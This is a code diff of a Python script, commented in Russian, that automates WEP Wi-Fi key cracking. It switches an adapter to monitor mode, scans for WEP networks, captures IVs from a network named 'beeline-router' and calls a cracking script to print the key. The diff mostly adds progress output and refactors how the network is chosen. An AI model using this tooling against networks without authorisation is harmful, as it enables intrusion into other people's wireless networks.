@@ -3,6 +3,7 @@ import pandas as pd
 import subprocess
 import time
 from io import StringIO
+import os
 
 # State
 currentMonitorAdapter = "_no_adapter_"
@@ -13,6 +14,8 @@ pollingProcess = 0
 isDumpingNetwork = False
 dumpingProcess = 0
 
+networks = 0
+
 # Const
 framesNeeded = 16000
 keySolveTimeout = 6
@@ -22,37 +25,49 @@ wifiSearchTimeout = 10
 def checkMonitorAdapter():
     return currentMonitorAdapter != "_no_adapter_"
 
+# Пример представлен ниже
 def main():
     try:
         # Получаем список Wi-Fi адаптеров
+        print('Получаем список Wi-Fi адаптеров')
         adapters = GetAdapters()
+        print(adapters)
         # Переводим в режим мониторинга адаптер из списка
+        print('Переводим в режим мониторинга адаптер из списка ', adapters[0])
         SwitchMonitorMode(adapters[0])
         # Начинаем процесс обнаружения Wi-Fi сетей
+        print('Начинаем процесс обнаружения Wi-Fi сетей')
         StartWepNetworksSearching()
+        print('Ожидание...')
         time.sleep(wifiSearchTimeout)
         # Завершаем процесс обнаружения Wi-Fi сетей
+        print('Завершаем процесс обнаружения Wi-Fi сетей')
+        print('\r', end='')
         StopWepNetworksSearching()
-        # Получаем Сети
+        # Получаем список WEP сетей
+        print('Получаем список WEP сетей')
+        print('\r', end='')
+        global networks
         networks = GetWepNetworks()
+        print(networks)
+        print('Упрощённый вид')
+        print(GetNetworksNameList())
 
-        i = networks["SSID"].index("beeline-router")
-        bssid = networks["BSSID"][i]
-        Channel = networks["Channel"][i]
-        SSID = networks["SSID"][i]
-
-        StartNetworkDumping(dict(zip(["BSSID", "Channel", "SSID"], [bssid, Channel, SSID])))
+        print('Начинаем дампить сеть beeline-router')
+        StartNetworkDumping("beeline-router")
 
         framesReady = 0
         while (framesReady < framesNeeded):
             time.sleep(frameCheckTimeout)
             framesReady = GetFramesQuantity()
+            print('Received IVs: ', framesReady, '\t', GetFramesPercentage(), '%', end='\r')
 
+        print()
         StopNetworkDumping()
 
         keyStr = GetNetworkKey()
         if keyStr != False:
-            print("The key is: ", keyStr)
+            print("The key is: ", keyStr, "\r")
         else:
             print("The key was not found. Try to capture more IVs")
     finally:
@@ -68,7 +83,7 @@ def Prepare() -> int:
     return ok
 
 def GetAdapters():
-    subprocess.run(["bash", "GetAdapters.sh"])
+    subprocess.run(["bash", "GetAdapters.sh"], stdout=open(os.devnull, 'w'))
     adaptersDf = pd.read_csv('adapters.txt', sep='\t', skipinitialspace=True)
     adapters = list(adaptersDf['Interface'])
     subprocess.run(['sudo', 'rm', 'adapters.txt'])
@@ -76,7 +91,7 @@ def GetAdapters():
     return adapters
 
 def SwitchMonitorMode(adapter : str):
-    ok = subprocess.run(["bash", "StartAdapter.sh", adapter])
+    ok = subprocess.run(["bash", "StartAdapter.sh", adapter], stdout=open(os.devnull, 'w'))
     if ok:
         global currentMonitorAdapter
         currentMonitorAdapter = adapter + "mon"
@@ -84,7 +99,7 @@ def SwitchMonitorMode(adapter : str):
 
 def StartWepNetworksSearching():
     if checkMonitorAdapter():
-        process = subprocess.Popen(["sudo", "bash", "WepNetworkSearching.sh", currentMonitorAdapter])
+        process = subprocess.Popen(["sudo", "bash", "WepNetworkSearching.sh", currentMonitorAdapter], stdout=open(os.devnull, 'w'))
 
         global isPollingNetworks
         isPollingNetworks = True
@@ -124,12 +139,29 @@ def GetWepNetworks():
 
     return []
 
-def StartNetworkDumping(network):
+def getNetworkParams(networkName : str):
+    global networks
+
+    i = networks["SSID"].index(networkName)
+    bssid = networks["BSSID"][i]
+    Channel = networks["Channel"][i]
+    SSID = networks["SSID"][i]
+
+    return dict(zip(["BSSID", "Channel", "SSID"], [bssid, Channel, SSID]))
+
+def StartNetworkDumping(networkName : str):
+    global isDumpingNetwork
+    isDumpingNetwork = True
+    network = getNetworkParams(networkName)
+
     global dumpingProcess
-    dumpingProcess = subprocess.Popen(["bash", "StartDumping.sh", network["BSSID"], network["Channel"], currentMonitorAdapter])
+    dumpingProcess = subprocess.Popen(["bash", "StartDumping.sh", network["BSSID"], network["Channel"], currentMonitorAdapter], stdout=open(os.devnull, 'w'))
     return dumpingProcess
 
 def StopNetworkDumping():
+    global isDumpingNetwork
+    isDumpingNetwork = False
+
     global dumpingProcess
     if dumpingProcess == 0:
         return
@@ -157,20 +189,12 @@ def GetFramesQuantity() -> int:
     # Создание DataFrame для первой таблицы
     table1 = pd.read_csv(StringIO(''.join(table1_lines)), skipinitialspace=True)
     # tempList = [int(k) for k in table1["IV"]]
-    return table1["# IV"][0]
+    return int(table1["# IV"][0])
     # Создание DataFrame для второй таблицы
     # table2 = pd.read_csv(StringIO(''.join(table2_lines)), skipinitialspace=True)
 
-def GetFramesPercentage():
-    if isDumpingNetwork:
-        return int(100 * GetFramesQuantity() / framesNeeded)
-    else:
-        return False
-
-
-
 def GetNetworkKey():
-    process = subprocess.Popen(["bash", "CrackKey.sh"])
+    process = subprocess.Popen(["bash", "CrackKey.sh"], stdout=open(os.devnull, 'w'))
 
     time.sleep(keySolveTimeout)
     process.terminate()
@@ -196,8 +220,23 @@ def GetAsciiKey(hex_string : str) -> str:
 
 
 def CleanAllPosteffects():
-    subprocess.run(["bash", "clean.sh", currentMonitorAdapter])
+    subprocess.run(["bash", "clean.sh", currentMonitorAdapter], stdout=open(os.devnull, 'w'))
     return
+
+
+def GetFramesPercentage():
+    global isDumpingNetwork
+    if isDumpingNetwork:
+        return int((100 * GetFramesQuantity()) / framesNeeded)
+    else:
+        return 0
+
+def GetNetworksNameList():
+    global networks
+    if (networks == 0):
+        return []
+    else:
+        return [networkName for networkName in networks["SSID"]]
 
 if __name__ == '__main__':
     main()
